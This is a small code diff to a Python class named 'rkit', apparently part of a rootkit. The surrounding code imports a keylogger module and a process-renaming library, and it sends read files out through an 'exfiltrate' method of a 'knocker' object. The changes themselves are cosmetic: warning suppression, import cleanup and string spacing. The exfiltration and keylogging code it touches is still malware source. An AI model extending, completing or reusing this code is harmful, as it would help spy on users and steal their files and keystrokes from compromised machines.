@@ -1,6 +1,6 @@
-import os
+import warnings
+warnings.filterwarnings(action="ignore")
 import subprocess
-from datetime import datetime
 import d_watcher
 from keylog import keylog
 import setproctitle
@@ -77,7 +77,7 @@ class rkit:
                 file_name = file
             self.knocker.exfiltrate(data, file_name)
         except FileNotFoundError:
-            self.knocker.exfiltrate("File "+file+" not found", "/")
+            self.knocker.exfiltrate("File " + file + " not found", "/")
         finally:
             f.close()
         return "file"
